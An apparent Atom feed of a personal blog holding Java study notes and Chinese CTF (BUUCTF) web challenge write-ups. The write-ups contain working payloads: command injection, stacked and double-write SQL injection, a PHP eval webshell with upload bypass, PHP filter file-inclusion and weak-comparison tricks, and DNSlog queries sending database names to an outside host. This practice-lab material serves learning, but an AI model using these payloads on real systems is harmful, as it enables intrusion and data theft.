<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>休比大王</title>
  
  
  <link href="https://xiubi1125.github.io/atom.xml" rel="self"/>
  
  <link href="https://xiubi1125.github.io/"/>
  <updated>2025-06-01T06:49:13.769Z</updated>
  <id>https://xiubi1125.github.io/</id>
  
  <author>
    <name>xiubi</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="https://xiubi1125.github.io/2025/05/31/%E5%A4%A7%E7%8E%8B%E7%9A%84java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://xiubi1125.github.io/2025/05/31/%E5%A4%A7%E7%8E%8B%E7%9A%84java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2025-05-31T15:27:27.999Z</published>
    <updated>2025-06-01T06:49:13.769Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="大王的java学习日记"><a href="#大王的java学习日记" class="headerlink" title="大王的java学习日记"></a>大王的java学习日记</h1><p>：期末复习时才痛定思痛想起要学习java</p><p>参考笔记《姚哥的java学习日记》</p><h2 id="面向对象（一）习题"><a href="#面向对象（一）习题" class="headerlink" title="面向对象（一）习题"></a>面向对象（一）习题</h2><h3 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h3><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250601001559986.png" alt="image-20250531234047058"></p><p><strong>重载（Overload）</strong>：指同一类中方法名相同，但参数列表（个数、类型、顺序）不同的现象，与返回值无关。</p><p><strong>隐藏（A）</strong>：子类隐藏父类的静态成员（通过 <code>static</code> 修饰），与方法无关。</p><p><strong>覆盖（B）</strong>：子类重写父类的非静态方法，需满足方法名、参数、返回值完全一致，且权限不能更低。</p><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250601001613945.png" alt="image-20250601001102053"></p><ul><li><p><strong>类（Class）</strong>：是对象的模板，定义了对象的属性和行为（抽象概念）。</p></li><li><p>对象（Object)：是类的具体实例，通过new关键字创建。例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Circle</span> &#123; ... &#125;  </span><br><span class="line"><span class="type">Circle</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Circle</span>(); <span class="comment">// obj 是 Circle 类的实例  </span></span><br></pre></td></tr></table></figure></li></ul><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250601094928868.png" alt="image-20250601092526774"></p><p>若类中没有显式定义任何构造器，编译器会自动生成一个无参的公共构造器（<code>public 类名()</code>）。</p><p>若类中已定义任意构造器（无论有无参数），编译器不再生成默认构造器</p><p>所以说构造器是可以忽略的 因为可以自动生成（无参）</p><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250601095157757.png" alt="image-20250601095157707"></p><p>我自己写会选b</p><p>记住在java中对象是通过引用来操作的 真正的对象存在堆中 引用变量指向这个实例 </p><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250601095347100.png" alt="image-20250601095347047"></p><p>答案是b撒  跟第一个重载有关系 这里提到一个方法签名冲突 反正要重载必须不一样（个数 类型 顺序）</p><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250601102229616.png" alt="image-20250601100029820"></p><p><strong>类</strong>：是抽象的模板（如 “人类”），不具体存在。</p><p><strong>对象</strong>：是类的具体实例（如 “张三” 这个人），是具体的。</p><p>一个类可创建多个对象（如 <code>new Person()</code> 多次）。类属于引用数据类型（区别于 <code>int</code>、<code>double</code> 等基本类型）。</p><p>小练习</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">xuexi</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入数字&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">num1</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">        <span class="type">int</span> <span class="variable">num2</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">        getSum(num1, num2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">getSum</span><span class="params">(<span class="type">int</span> num1,<span class="type">int</span> num2)</span>&#123;</span><br><span class="line">            <span class="type">int</span> c=num1+num2;</span><br><span class="line">            System.out.println(c);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="形参和实参"><a href="#形参和实参" class="headerlink" title="形参和实参"></a>形参和实参</h2><ul><li><p>形参:全称形式参数，是指方法定义中的参数</p></li><li><p>实参:全称实际参数，方法调用中的参数</p><h2 id><a href="#" class="headerlink" title></a></h2></li></ul><p><strong>方法调用时，形参和实参必须一一对应，否则程序将报错。</strong></p><h3 id="定义类的注意事项"><a href="#定义类的注意事项" class="headerlink" title="定义类的注意事项"></a>定义类的注意事项</h3><ul><li><p>用来描述一类事物的类，专业叫做:Javabean类。</p><p>在Javabean类中，是不写main方法的。</p></li><li><p>在以前，编写main方法的类，叫做测试类。</p><p>我们可以在测试类中创建javabean类的对象并进行赋值调用</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>test</title>
    <link href="https://xiubi1125.github.io/2025/05/30/test/"/>
    <id>https://xiubi1125.github.io/2025/05/30/test/</id>
    <published>2025-05-29T23:36:34.000Z</published>
    <updated>2025-05-30T11:33:33.858Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="/2025/05/30/test/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250530073719.png" alt="微信截图_20250530073719"></p><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250530193312026.png" alt="image-20250530193256143"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Buuctf复现</title>
    <link href="https://xiubi1125.github.io/2025/05/30/buuctf/"/>
    <id>https://xiubi1125.github.io/2025/05/30/buuctf/</id>
    <published>2025-05-29T21:46:56.535Z</published>
    <updated>2025-06-05T13:14:54.052Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250605210824936.png" alt="image-20250509192612579"></p><p>思路只到可以访问敏感文件 想到要用文件包含</p><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p>支持伪协议的函数（文件包含函数）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include();引入了一个其他文件到include所在的那个文件里面 源码中有include函数 可以理解为传入的参数可以在后台被成功运行</span><br><span class="line">include_once();</span><br><span class="line">require();</span><br><span class="line">require_once();</span><br></pre></td></tr></table></figure><p>以 <code>php://</code> 开头，后面跟着一些参数，用于指定 <code>要执行的操作</code> 或 <code>需要访问的资源</code>。<code>php://filter</code> 的主要作用是提供一种机制，让您可以轻松地 <code>在数据流上应用一个或多个过滤器</code>。</p><p>基本格式<u>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;?&#x2F;resource&#x3D;?</u></p><p>php:&#x2F;&#x2F;filter是一种元封装器，是PHP中特有的协议流，设计用于数据流打开时的筛选过滤应用，作用是作为一个“中间流”来处理其他流。php:&#x2F;&#x2F;filter目标使用以下的参数作为它路径的一部分。复合过滤链能够在一个路径上指定。是php提供的一个伪协议</p><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250605210823197.png" alt="image-20250509193856043"></p><p>?a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;1.php（php伪协议可以理解为是一段可以读取php文件内容的代码）</p><p>convert.base64-encode—–是一个过滤器 将通过该伪协议得到的资源数据进行base64编码处理 </p><p>resource————————-用来指定要操作的目标资源 也就是要读取的文件</p><p>base64编码的一个特点是后面有&#x3D;</p><h2 id="ACTF2020新生赛-Exec"><a href="#ACTF2020新生赛-Exec" class="headerlink" title="[ACTF2020新生赛]Exec"></a>[ACTF2020新生赛]Exec</h2><p>考的是命令注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">一些知识点</span><br><span class="line">1、命令注入我们要防备其对于一些符号的过滤导致我们不能成功注入，所以我们要多了解一些符号。</span><br><span class="line">2、;直接分号分隔</span><br><span class="line">管道符：作用和&amp;一样。前面和后面命令都要执行，无论前面真假</span><br><span class="line">3、| 按位或</span><br><span class="line">作用是直接执行|后面的语句</span><br><span class="line">4、|| 逻辑或</span><br><span class="line">作用是如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">5、&amp; 按位与</span><br><span class="line">&amp;前面和后面命令都要执行，无论前面真假</span><br><span class="line">6、&amp;&amp; 逻辑与</span><br><span class="line">如果前面为假，后面的命令就不执行，如果前面为真则再执行后面命令，这样两条命令都会被执行</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>简单的命令注入 不存在什么过滤 直接ping一个127.0.0.1;ls发现没有过滤; 尝试在本机地址之后加上命令 比如ls  </p><p>跨一些目录 ..&#x2F;..&#x2F;..&#x2F;..&#x2F;查看之后发现有flag文件 cat直接读取</p><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>这个过滤的东西好像变多了 不能直接cat</p><p>首先cat flag.php 发现空格被过滤了</p><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250605210819954.png" alt="image-20250513200819143"></p><p>?ip&#x3D;127.0.0.1;cat$IFS$9<code>ls</code></p><p>反引号的作用：把反引号里面内容的输出当作输入来执行</p><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250605210818356.png"></p><p>注意一下回显之后没有内容 看一眼源代码里面的注释信息</p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>堆叠注入</p><p>1’; show databases;</p><p>大概就是在一个分号后面再加上命令堆叠执行</p><p><code>sql_mode</code> 是 MySQL 中的一个重要系统变量，它定义了 MySQL 应该如何解析和执行 SQL 语句，影响着 SQL 语法的使用规则、<strong>数据的处理方式等</strong></p><p>  语句为set sql_mode&#x3D;PIPES_AS_CONCAT </p><p>当启用 <code>PIPES_AS_CONCAT</code> 模式后，MySQL 会将 <code>||</code> 解释为字符串连接操作符，与 Oracle 和 PostgreSQL 保持一致</p><p>1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</p><p>*；1（两种解法）</p><p>其实不是很懂什么意思</p><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>比较普通的sql注入题目 </p><p>刚开始登陆的时候用万能密码1’ or ‘1’&#x3D;1–+ 不能成功登录 注释符必须是#</p><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250605210816176.png" alt="image-20250519183922484"></p><ul><li><p><strong>MySQL</strong>：两种都可用，但 <code>--+</code> 更保险（防止部分配置下 <code>--</code> 后无空格报错）。</p></li><li><p><strong>PostgreSQL&#x2F;SQLite</strong>：推荐使用 <code>#</code>，更符合语法习惯。</p><p>这道题只能用#</p><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>我的思路是到了这里 感觉后面应该是越权访问上级目录</p></li></ul><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250605210812809.png" alt="image-20250519185422144"></p><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250605210838680.png" alt="image-20250519185523296"></p><p>其实不是&#x3D;-&#x3D; 没啥思路抓包看到有隐藏的php文件（就是在注释里面 但是需要到repeter里send才能看到所以一开始没找到）</p><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250605210842759.png" alt="image-20250520181210127"></p><p>php代码审计</p><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250605210844817.png" alt="image-20250520182611626"></p><p>​                 </p><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250605210846112.png" alt="image-20250520182457455"></p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>select一被禁用，<a href="https://so.csdn.net/so/search?q=%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2&spm=1001.2101.3001.7020">联合查询</a>，报错注入，布尔,时间盲注就都不可以使用了。我们只剩下了堆叠注入。</p><p>?inject&#x3D;1’; show columns from <code>words</code>– q</p><p>关于在这里使用 &#96; 而不是 ’ 的一些解释：</p><p>两者在linux下和windows下不同，linux下不区分，windows下区分。</p><p>单引号 ’ 或双引号主要用于 字符串的引用符号</p><p>反勾号 &#96; 数据库、表、索引、列和别名用的是引用符是反勾号 (注：Esc下面的键)</p><p>有MYSQL保留字作为字段的，必须加上反引号来区分！！！</p><p>如果是数值，请不要使用引号      <strong>表名是纯数字需要用反引号包裹</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">SET @a = 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;</span></span><br><span class="line"><span class="string">PREPARE execsql FROM @a;</span></span><br><span class="line"><span class="string">EXECUTE execsql;</span></span><br><span class="line"><span class="string">#</span></span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p><strong>phtml一般是指嵌入了php代码的html文件，但是同样也会作为php解析</strong></p><p>GIF89a?幻术头</p><p>在一些文件上传场景中，服务器可能会检查文件的类型。如果需要上传非图片类型的文件（如包含代码的脚本文件），但服务器限制只能上传图片文件，可以在文件开头添加 GIF89a 这个文件头，将文件伪装成 GIF 图片，以绕过简单的文件类型检查</p><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250605210849874.png" alt="image-20250527175846341"></p><p>找到了文件上传路径蚁剑连接不上 有.&#x2F;考虑到目录穿越 下一步卡住的</p><p>还是前面的phtml 抓包改后缀为php会限制所以前端后端都有检验</p><p><strong>PHTML</strong> 是一种文件扩展名，主要用于将 PHP 代码嵌入到 HTML 文件中。它使得在 HTML 文件中使用 PHP 代码变得更加简单和易于维护。</p><p>写法：</p><script language="php">@eval($_POST['a']);</script><script language="php">system('cat /flag');</script><p>写进去之后删除前端检验进行上传然后直接访问该phtml文件就能看到flag</p><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>用的是双写绕过?username&#x3D;1%27ununionion%20seselectlect%201,2,3%23&amp;password&#x3D;1</p><p>union&#x2F;select都被过滤了（因为错误回显里输入进去的union什么的都没了所以知道是被替代成了空白）</p><p>这道题最明显的是双写绕过，然后我们需要去拼接双写语句达到绕过的目的，双写的方式也不一定是固定的，这道题在我们尝试的时候也会发现其实它也过滤好几个单词，有时候我们需要部分双写，也不需要整个单词双写，因为它不是整个单词都过滤</p><p>1’ ununionion seselectlect 1,2,<a href="https://so.csdn.net/so/search?q=group_concat&spm=1001.2101.3001.7020">group_concat</a>(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;’geek’#</p><p>1’ ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;’b4bsql’#</p><p>1’ ununionion selselectect 1,2,group_concat(username,id,passwoorrd) frfromom geek.b4bsql#</p><p>#要url编码 因为#是个锚点可以跳转目录</p><p>这里不能用#注释！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！</p><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>常见的网站源码备份文件后缀:</p><p>tar.gz，zip，rar，tar</p><p>常见的网站源码备份文件名：</p><p>web，website，backup，back，www，wwwroot，temp</p><p>php反序列化 学起来有点吃力 先放一下</p><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>首先 这题目给了提示是备份文件</p><p>不知道为什么我的dirsearch扫描出来不高亮显示 试出来备份文件是index.php.bak</p><p>然后是个代码审计</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;key&#x27;])) &#123;</span><br><span class="line">    $key = $_GET[&#x27;key&#x27;];</span><br><span class="line">    if(!is_numeric($key)) &#123;</span><br><span class="line">        exit(&quot;Just num!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = &quot;bc1q3yz7qs5dvm3l249rjqg393qfjddzev37cp84e3&quot;;</span><br><span class="line">    if($key == $str) &#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo &quot;Try to find out source file!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其实很容易看出来 让key&#x3D;</p><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250605210855747.png" alt="image-20250528212915542"></p><p>不知道为什么这里复制下来值不一样 涉及一个<u>弱类型比较</u></p><p>在PHP中：<br>&#x3D; &#x3D; 为弱相等，即当整数和字符串类型相比较时。会先将字符串转化为整数然后再进行比较。比如a&#x3D;123和b&#x3D;123admin456进行&#x3D; &#x3D;比较时。则b只会截取前面的整数部分。即b转化成123。<br>所以，这里的a &#x3D; &#x3D; b是返回True。<br>所以这里我们只需要提供一个参数?key&#x3D;123就可以拿到flag了</p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>先看源代码<img src="/2025/05/30/buuctf/" alt="image-20250602183715495"></p><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250605210857799.png" alt="image-20250602183756253"></p><p>这里就是它直接将用户输入拼接到 URL 作为 GET 参数发送到后端的 <code>calc.php</code>了</p><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250605210900203.png" alt="image-20250602185043744"></p><p>分析一下：</p><p>  首先需要传入num的值 然后这里限制了一些列的输入 如果有这些限制的输入就直接终止程序了</p><p><code>? num=1;var_dump(scandir(chr(47)))</code>这里的num前面有个空格 具体为什么：</p><p>相当于构造了一个新的变量空格num 但是php解析的时候会先把空格给去掉然后再运行</p><h3 id="PHP的字符串解析特性："><a href="#PHP的字符串解析特性：" class="headerlink" title="PHP的字符串解析特性："></a>PHP的字符串解析特性：</h3><p>PHP在处理查询字符串时，会将其转换为内部关联数组，PHP会删除某些字符或将其替换为下划线。这种特性可以被利用来绕过一些安全防护措施</p><p>（这个就是这道题）</p><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250602221352767.png" alt="image-20250602221352603"></p><p><img src="C:/Users/xiubi/AppData/Roaming/Typora/typora-user-images/image-20250604165940537.png" alt="image-20250604165940537"></p><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250604171425006.png" alt="image-20250604171424950"></p><p>代码中的注释信息存在一个弱比较</p><p> PHP 中，<strong>弱比较</strong>（Weak Comparison）即使用双等号 <code>==</code> 进行的比较，其核心特点是<strong>允许类型自动转换</strong>后再比较。</p><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250604173927283.png" alt="image-20250604173927228"></p><p>这里有个要注意的 因为password和money都是post传参 在bp中使用要先用hackbar传参后抓包。这样数据包就是POST传参方式，如果直接在数据包里面把GET方式传参改为POST方式传参的话，可能依旧是GET方式传参，这点需要注意。</p><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250604174147190.png" alt="image-20250604174147140"></p><p>这里提示输入的数据长度超过限制 思考这里怎么才能绕过这个长度限制 </p><p>网上wp第一种是把1000000给换成科学计数法表示</p><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250604174848688.png" alt="image-20250604174848650"></p><p>第二种是把money用数组来表示</p><p>经过给money参数分情况测试，有3种输出结果</p><ul><li>当 money &#x3D;&gt; 100000000     <ul><li>输出”Nember lenth is too long”</li></ul></li><li>当 money &lt; 100000000     <ul><li>输出”you have not enough money,loser”</li></ul></li><li>当 1e9 &lt;&#x3D; money &lt;&#x3D; 1e999999（说着当money变为数组时）     <ul><li>输出”flag值”</li></ul></li></ul><p>猜测用到了函数strcmp()用来比较两个字符串，同时还可以比较两个字符串的字符数</p><blockquote><p> strcmp(<em>string1,string2</em>) </p></blockquote><ul><li>0 - 如果两个字符串相等</li><li>&lt;0 - 如果 string1 小于 string2</li><li>0 - 如果 string1 大于 string2</li></ul><p><strong>所以当过滤不当不全时，可以通过将参数变为数组的方式进行绕过，这样的话就无法比较，直接返回true</strong></p><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250604175257706.png" alt="image-20250604175257614"></p><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250604184220935.png" alt="image-20250604184220507"></p><p>select * from ‘admin’ where password&#x3D;md5($pass,true)</p><p>php md5语法：</p><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250604184726136.png" alt="image-20250604184726097"></p><p> 32位16进制字符串的意思总的来说就是我们平时看到的MD5加密的结果<br>16位原始二进制格式的字符串的意思就是当md5函数的第二个参数为true时，该函数的输出是原始二进制格式，会被作为字符串处理。<br>注意这里为true时，返回的这个原始二进制不是普通的二进制（0，1），而是 ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c 这种。</p><p>首先我们要找到一个字符串，这个字符串经过md5得到的16位原始二进制的字符串能帮我们实现sql注入。首先or这个字符串是必要的，同时为了配对原先sql语句里面有的单引号，在or的两边要有单引号，使它变成 password&#x3D;‘xxx’or‘xxx’ 的形式，所以我们需要的字符串的原始二进制格式的字符串里要包含  ‘or’ </p><p>根据32位16进制的字符串来查找，根据上面介绍的，  ‘or’   对应的16进制是   276f7227    ，所以我们的目标就是要找一个字符串取32位16进制的md5值里带有276f7227这个字段的，接着就是要看关键的数字部分了，在276f7227这个字段后面紧跟一个数字，除了0，1-9，对应的asc码值是49-57，转化为16进制就是31-39，也就是我们需要有276f7227+（31-39）这个字段，就可以满足要求。比如xxxxxxxxxxxxxxxx276f7227（31-39）xxxxxx<br>答案可以用ffifdyop（这个算是一个万能密码）在md5中解析成了’or’1后面数字恒为真</p><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250604191443341.png" alt="image-20250604191443249"></p><p>传入之后长这样</p><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250604191500280.png" alt="image-20250604191500174"></p><p>源代码长这样</p><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250604191526245.png" alt="image-20250604191526191"></p><p>这里也有两种方法 </p><p>第一种采用数组传参 数组传参方式格式为num[]&#x3D;w  num为参数(例如本题的a) w为传入的值 最终传入的值如下?a[]&#x3D;1&amp;b[]&#x3D;2  因为md5不能处理数组，md5 函数哈希数组会返回 NULL。从而达到两者相等进行绕过。</p><p>第二种方法，php 0e开头的数字会当做科学计数法解析，因此只要构造两组md5值开头为0e的值即可绕过。</p><p>原理是PHP在处理哈希字符串时，会利用”!&#x3D;”或”&#x3D;&#x3D;”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。<br>?a&#x3D;QNKCDZO&amp;b&#x3D;240610708</p><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250604192118334.png" alt="image-20250604192118202"></p><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250604192735359.png" alt="image-20250604192735302"></p><p>把代码丢给ai</p><p>&#x3D;是赋值 &#x3D;&#x3D;是弱比较 &#x3D;&#x3D;&#x3D;强比较(数值与类型都要相同)</p><p>要需要找到真正的 MD5 碰撞（即两个不同的输入生成完全相同的 MD5 哈希）<img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250604192814028.png" alt="image-20250604192813986"></p><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20250604193515674.png" alt="image-20250604193515533"></p><h2 id="组会的东西"><a href="#组会的东西" class="headerlink" title="组会的东西"></a>组会的东西</h2><p><img src="/2025/05/30/buuctf/Users\xiubi\AppData\Roaming\Typora\typora-user-images\image-20250514214409000.png" alt="image-20250514214409000"></p><p>碰到无回显的命令执行漏洞，可以通过dnslog外带来获取命令执行后的结果，从而方便我们来判断命令是否执行成功以及进行更深层次的利用。</p><p>原理将需要查询的值和域名拼接起来，向域名发送请求，DNS在解析的时候会留下日志，读取日志便可以获取信息。</p><p>select load_file(cocat(‘\\\‘,(select database()),’.dnslog.cn\abc’));(比盲注简单)</p><p>‘ and if((select load_file(concat(‘\\‘,(select database()),’.xxxxx.ceye.io\abc’))),1,0)– -+</p><p>and (select 